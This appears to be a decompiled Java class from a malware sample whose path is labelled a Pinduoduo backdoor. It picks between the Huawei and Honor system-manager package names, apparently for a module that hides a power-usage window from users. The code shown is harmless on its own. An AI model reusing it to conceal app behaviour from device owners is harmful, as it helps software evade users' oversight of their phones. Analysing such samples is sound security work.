package com.google.android.sd.biz_dynamic_dex.hw_hide_power_window;

import android.content.Context;

public class ManagerPkgGetOnHw {
  private static final String HONOR_MANAGER_PKG = "com.hihonor.systemmanager";
  
  private static final String HW_MANAGER_PKG = "com.huawei.systemmanager";
  
  public static String getManagerPkgName(Context paramContext) {
    return isPkgExist(paramContext, "com.huawei.systemmanager") ? "com.huawei.systemmanager" : (isPkgExist(paramContext, "com.hihonor.systemmanager") ? "com.hihonor.systemmanager" : "com.huawei.systemmanager");
  }
  
  private static boolean isPkgExist(Context paramContext, String paramString) {
    try {
      paramContext.getPackageManager().getApplicationInfo(paramString, 8192);
      return true;
    } catch (Exception exception) {
      return false;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\7c6e6702-e461-4315-8631-eee246aeba95-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\hw_hide_power_window\ManagerPkgGetOnHw.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */